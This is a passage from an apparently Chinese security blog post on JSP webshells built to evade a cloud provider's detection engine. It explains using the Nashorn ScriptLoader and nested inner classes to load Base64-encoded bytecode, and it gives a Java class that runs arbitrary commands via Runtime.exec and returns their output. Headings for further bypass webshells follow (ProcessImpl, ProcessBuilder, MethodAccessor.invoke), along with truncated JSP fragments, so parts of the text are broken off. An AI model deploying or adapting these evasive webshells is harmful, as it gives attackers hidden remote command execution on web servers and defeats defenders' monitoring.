    %>
这个马和前面的自定义类加载器没什么大区别，但是是使用了`jdk.nashorn.internal.runtime.ScriptLoader`，这种情况只是想展示不一样的姿势，最主要的是，如果某些类加载器被禁用了，就可以使用这个特殊的类加载器去加载字节码执行，不过其实还是需要调用invoke进行加载的，而某云的检测还是会检测到的，但是这里使用了多层的内部类形式，成功的绕过了某云的检测，invoke的绕过不是重点，重点的是想说一下有这样的一个类加载器。
    import java.io.BufferedReader;
    import java.io.IOException;
    import java.io.InputStream;
    import java.io.InputStreamReader;
    import java.util.Base64;
    /**
     * @author threedr3am
     */
    public class Threedr3am_6 {
        String res;
        public Threedr3am_6(String cmd) throws IOException {
            StringBuilder stringBuilder = new StringBuilder();
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));
            String line;
            while((line = bufferedReader.readLine()) != null) {
                stringBuilder.append(line).append("\n");
            }
            res = stringBuilder.toString();
        }
        @Override
        public String toString() {
            return res;
        }
        public static void main(String[] args) throws IOException {
            InputStream inputStream = Threedr3am_6.class.getClassLoader().getResourceAsStream("Threedr3am_6.class");
            byte[] bytes = new byte[inputStream.available()];
            inputStream.read(bytes);
            String code = Base64.getEncoder().encodeToString(bytes);
            System.out.println(code);
        }
    }
### 七、使用内部类绕某云检测java.lang.ProcessImpl以及invoke的一个JSP Webshell
    java.lang.ProcessImpl JSP Webshell
     0) {
                response.getOutputStream().write(stringBuilder.toString().getBytes());
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    %>
### 八、使用内部类绕某云检测java.lang.ProcessBuilder以及invoke的JSP Webshell
    java.lang.ProcessBuilder JSP Webshell
### 九、利用MethodAccessor.invoke绕过检测Method.invoke的JSP Webshell
    MethodAccessor.invoke绕过检测Method.invoke的JSP Webshell
    <%!